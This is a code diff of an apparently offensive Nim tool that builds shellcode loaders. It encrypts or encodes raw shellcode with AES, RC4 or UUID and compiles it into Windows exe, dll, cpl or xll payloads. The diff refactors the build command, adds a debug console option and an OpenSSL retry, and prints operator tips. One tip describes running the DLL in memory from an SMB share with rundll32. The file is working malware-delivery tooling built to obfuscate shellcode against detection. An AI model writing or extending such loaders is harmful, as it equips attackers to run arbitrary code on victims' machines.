@@ -30,7 +30,7 @@ var
     verbosity: bool
     obfuscate: string
     file: string
-    templatePath: string
+    templatePath: string 
     shellcode: string
     scArray: seq[byte]
     aesPasswd: string
@@ -40,21 +40,25 @@ var
     encSC: seq[byte]
     testVar: string = " @[byte "
     compileCmd: string
-
+    debug: bool
+    
 var p = newParser:
     flag("-v", "--verbose", help="Show all output")
+    flag("-d", "--debug", help="Enable visible command prompt")
     option("-o", "--obfuscate", help="Specify which obfuscation method to use", choices= @["aes", "rc4", "uuid"], default=some("uuid"))
-    option("-p", "--path", help="Specify path to raw shellcode file", required=true)
+    option("-s", "--shellcode", help="Specify path to raw shellcode file", required=true)
     option("-a", "--arch", help="Specify architecture of output file. Only applies to XLL payloads!", choices= @["x64", "x86"], default=some("x64"))
     option("-e", "--extension", help="Specify output file type.", choices= @["cpl", "xll", "dll", "exe"], default=some("dll"))
 
 try:
     var opts = p.parse()
-    shellcodeFilePath = opts.path
+    shellcodeFilePath = opts.shellcode
     architecture = opts.arch
     verbosity = opts.verbose
     obfuscate = opts.obfuscate
     extension = opts.extension
+    debug = opts.debug
+
 except ShortCircuit as err:
     if err.flag == "argparse_help":
         echo err.help
@@ -64,12 +68,34 @@ except UsageError:
     quit(1)
 
 if obfuscate == "aes":
-    templatePath = "templates/aes/"
+    templatePath = joinPath(getCurrentDir(), "templates/aes/")
 elif obfuscate == "rc4":
-    templatePath = "templates/rc4/"
+    templatePath = joinPath(getCurrentDir(), "templates/rc4/")
 else:
-    templatePath = "templates/uuid/"
+    templatePath = joinPath(getCurrentDir(), "templates/uuid/")
+
+templatePath = joinPath(templatePath, fmt"simple{extension}.nim")
+var tempFile = "temp_simple$1.nim" % [extension]
+
+proc buildCompileCmdStr(): void =
+    # Base Compile Command
+    compileCmd = fmt "{joinPath(getHomeDir(), \".nimble/bin/nim\")} c -d:mingw --opt:none -d:strip -d:release -d:danger -o=simple{obfuscate}.{extension}"
+
+    # Set file type specific options
+    if extension != "exe": compileCmd.add(" --nomain --app=lib")
+    else:
+        if debug: compileCmd.add(" --app=console")
+        else: compileCmd.add(" --app=gui")
+
+    # Set encoding/encryption specific options
+    if obfuscate != "uuid": compileCmd.add(" -l:resource.o")
+
+    if architecture == "x64": compileCmd.add(" --cpu=amd64")
+    else: compileCmd.add(" --cpu=i386")
     
+    # Set file to compile
+    compileCmd.add(" " & tempFile)
+
 proc aesEncrypt(): void = 
     
     ## Nim's way API using openArray[byte].
@@ -107,18 +133,27 @@ proc rc4Encrypt(): void =
         echo "[Status] RC4 key hexadecimal is: $1" % [xxdKey]
     else:
         stdout.styledWriteLine(fgRed, "[Failure] Key generation failed!")
-        echo "[Tip] Ensure xxd is in /usr/bin!"
-    let opensslCmd: string = "/usr/bin/openssl enc -rc4 -in $1 -K $2 -nosalt -out encContent.bin" % [shellcodeFilePath, xxdKey]
+        stdout.styledWriteLine(fgCyan, "[Tip] Ensure xxd is installed and in /usr/bin!")
+    var opensslCmd: string = "/usr/bin/openssl enc -rc4 -in $1 -K $2 -nosalt -out encContent.bin" % [shellcodeFilePath, xxdKey]
     echo "[Status] Running the following command: $1" % [opensslCmd]
     try:
-        let opensslResult = execCmdEx(opensslCmd)
+        var opensslResult = execCmdEx(opensslCmd)
         if opensslResult.exitCode == 0:
             stdout.styledWriteLine(fgGreen, "[Success] RC4 Encrypted shellcode file created!")
         else:
             stdout.styledWriteLine(fgRed, "[Failure] OpenSSL failed!")
             stdout.styledWriteLine(fgRed, opensslResult.output)
-            echo "[Tip] Ensure OpenSSL is in /usr/bin!"
-            quit(1)
+            echo "[Status] Trying again with added option: -provider legacy"
+            # Add option to OpenSSL
+            opensslCmd.add(" -provider legacy")
+            opensslResult = execCmdEx(opensslCmd)
+            if opensslResult.exitCode == 0:
+                stdout.styledWriteLine(fgGreen, "[Success] RC4 Encrypted shellcode file created!")
+            else:
+                stdout.styledWriteLine(fgRed, "[Failure] OpenSSL failed!")
+                stdout.styledWriteLine(fgRed, opensslResult.output)
+                stdout.styledWriteLine(fgCyan, "[Tip] Ensure OpenSSL is installed and in /usr/bin!")
+                quit(1)
     except IOError:
         stdout.styledWriteLine(fgRed, "[Failure] Could not create RC4 encrypted shellcode file!")
         quit(1)
@@ -141,7 +176,7 @@ proc rc4Encrypt(): void =
         removeFile("resource.rc")
     else:
         stdout.styledWriteLine(fgRed, "[Failure] Could not compile resource file!")
-        echo "[Tip] Ensure x86_64-w64-mingw32-windres is in /usr/bin!"
+        stdout.styledWriteLine(fgCyan, "[Tip] Ensure x86_64-w64-mingw32-windres is in /usr/bin!")
         stdout.styledWriteLine(fgRed, rcCompileResults.output)
         quit(1)
 
@@ -173,7 +208,8 @@ proc uuidEncode(sc: string): (int, seq[string]) =
 proc generatePayload(): void =
     var 
         templateFile: string
-        tempFile: string
+        #tempFile: string
+    buildCompileCmdStr()
     # Read raw shellcode file
     try:
         echo """
@@ -192,67 +228,10 @@ proc generatePayload(): void =
         stdout.styledWriteLine(fgRed, "[Failure] Could not open shellcode file!")
         quit(1)
     echo "[Status] Generating Payload! Be patient."
-
-    # Encode/Encrypt bytes
-    #aesencrypt()
-    #rc4Encrypt()
-
-    case extension:
-        of "exe":
-            templatePath = joinPath(templatePath, "simpleexe.nim")
-            try:
-                templateFile = templatePath.readFile()
-            except IOError:
-                stdout.styledWriteLine(fgRed, "[Failure] Could not locate template file at $1" % [templatePath])
-            tempFile = "temp_simpleexe.nim"
-
-            if obfuscate != "uuid":
-                compileCmd = "$1 c -d:mingw --mm:arc -d:useMalloc --opt:none --app=gui -l:resource.o --cpu=amd64 -d:release -d:danger -d:strip -o=simpleexe.exe temp_simpleexe.nim" % [joinPath(getHomeDir(), ".nimble/bin/nim")]
-            else :
-                compileCmd = "$1 c -d:mingw --mm:arc -d:useMalloc --opt:none --app=gui --cpu=amd64 -d:release -d:danger -d:strip -o=simpleexe.exe temp_simpleexe.nim" % [joinPath(getHomeDir(), ".nimble/bin/nim")]
-        of "cpl":
-            templatePath = joinPath(templatePath, "simplecpl.nim")
-            try:
-                templateFile = templatePath.readFile()
-            except IOError:
-                stdout.styledWriteLine(fgRed, "[Failure] Could not locate template file at $1" % [templatePath])
-            tempFile = "temp_simplecpl.nim"
-
-            if obfuscate != "uuid":
-                compileCmd = "$1 c -d:mingw --nomain -l:resource.o --mm:arc -d:useMalloc --opt:none --app=lib --cpu=amd64 -d:strip -d:release -d:danger -o=simplecpl.cpl temp_simplecpl.nim" % [joinPath(getHomeDir(), ".nimble/bin/nim")]
-            else:
-                compileCmd = "$1 c -d:mingw --nomain --mm:arc -d:useMalloc --opt:none --app=lib --cpu=amd64 -d:strip -d:release -d:danger -o=simplecpl.cpl temp_simplecpl.nim" % [joinPath(getHomeDir(), ".nimble/bin/nim")]
-        of "dll":
-            templatePath = joinPath(templatePath, "simpledll.nim")
-            try:
-                templateFile = templatePath.readFile()
-            except IOError:
-                stdout.styledWriteLine(fgRed, "[Failure] Could not locate template file at $1" % [templatePath])
-            tempFile = "temp_simpledll.nim"
-
-            if obfuscate != "uuid":
-                compileCmd = "$1 c -d:mingw -l:resource.o --nomain --opt:none --app=lib --cpu=amd64 -d:strip -d:release -d:danger -o=simpledll.dll temp_simpledll.nim" % [joinPath(getHomeDir(), ".nimble/bin/nim")]
-            else:
-                compileCmd = "$1 c -d:mingw --nomain --opt:none --app=lib --cpu=amd64 -d:strip -d:release -d:danger -o=simpledll.dll temp_simpledll.nim" % [joinPath(getHomeDir(), ".nimble/bin/nim")]
-        of "xll":
-            templatePath = joinPath(templatePath, "simplexll.nim")
-            try:
-                templateFile = templatePath.readFile()
-            except IOError:
-                stdout.styledWriteLine(fgRed, "[Failure] Could not locate template file at $1" % [templatePath])
-            tempFile = "temp_simplexll.nim"
-
-            if obfuscate != "uuid" and architecture == "x64":
-                compileCmd = "$1 c -d:mingw -l:resource.o --nomain --opt:none --app=lib --cpu=amd64 -d:strip -d:release -d:danger -o=simplexll.xll temp_simplexll.nim" % [joinPath(getHomeDir(), ".nimble/bin/nim")]
-            elif obfuscate == "uuid" and architecture == "x64":
-                compileCmd = "$1 c -d:mingw --nomain --opt:none --app=lib --cpu=amd64 -d:strip -d:release -d:danger -o=simplexll.xll temp_simplexll.nim" % [joinPath(getHomeDir(), ".nimble/bin/nim")]
-            elif obfuscate != "uuid" and architecture == "x86":
-                compileCmd = "$1 c -d:mingw -l:resource.o --nomain --opt:none --app=lib --cpu=i386 -d:strip -d:release -d:danger -o=simplexll.xll temp_simplexll.nim" % [joinPath(getHomeDir(), ".nimble/bin/nim")]
-            else:
-                compileCmd = "$1 c -d:mingw --opt:none --app=lib --nomain --cpu=i386 -d:strip -d:release -d:danger -o=simplexll.xll temp_simplexll.nim" % [joinPath(getHomeDir(), ".nimble/bin/nim")]
-        else:
-            stdout.styledWriteLine(fgRed, "[Failure] Extension argument must be exe, dll, xll, or cpl!")
-            quit(1)
+    try:
+        templateFile = templatePath.readFile()
+    except IOError:
+        stdout.styledWriteLine(fgRed, "[Failure] Could not locate template file at $1" % [templatePath])
 
     if obfuscate == "uuid":
         # Generate UUID payload
@@ -313,22 +292,30 @@ proc generatePayload(): void =
         except IOError:
             stdout.styledWriteLine(fgRed, "[Failure] Copy from template file failed!")
     
-    echo "[Status] Waiting on compiler!"
+    echo "[Status] Waiting on compiler..."
     let compileResults = execCmdEx(compileCmd)
-    tempFile.removeFile()
-    echo "[Status] Cleaning up!"
-    if fileExists("resource.o"):
-        removeFile("resource.o")
-    if fileExists("encContent.bin"):
-        removeFile("encContent.bin")
     if compileResults.exitCode != 0:
         stdout.styledWriteLine(fgRed, "[Failure] Cannot compile payload!")
         stdout.styledWriteLine(fgRed, compileResults.output)
         quit(1)
     elif compileResults.exitCode == 0 and verbosity:
         echo compileResults.output
+        stdout.styledWriteLine(fgGreen, "[Success] Payload compiled successfully!")
+    else:
+        stdout.styledWriteLine(fgGreen, "[Success] Payload compiled successfully!")
+        if "cpl" in compileCmd: stdout.styledWriteLine(fgCyan, "[Tip] Treat .cpl files the same as .exe!")
+        elif "dll" in compileCmd: 
+            stdout.styledWriteLine(fgCyan, fmt"[Tip] Try running with 'rundll32 simple{obfuscate}.{extension},start'")
+            stdout.styledWriteLine(fgCyan, fmt"[Pro Gamer Move] Run in memory by hosting on SMB Server and running with 'rundll32 \\<IP>\<SHARE>\simple{obfuscate}.{extension},start'")
     
-    stdout.styledWriteLine(fgGreen, "[Success] Payload compiled successfully!")
+    echo "[Status] Cleaning up..."
+    tempFile.removeFile()
+    if fileExists("resource.o"):
+        removeFile("resource.o")
+    if fileExists("encContent.bin"):
+        removeFile("encContent.bin")
+    echo fmt "[Status] Done! simple{obfuscate}.{extension} created!"
+    quit(0)
 
 when isMainModule:
     generatePayload()
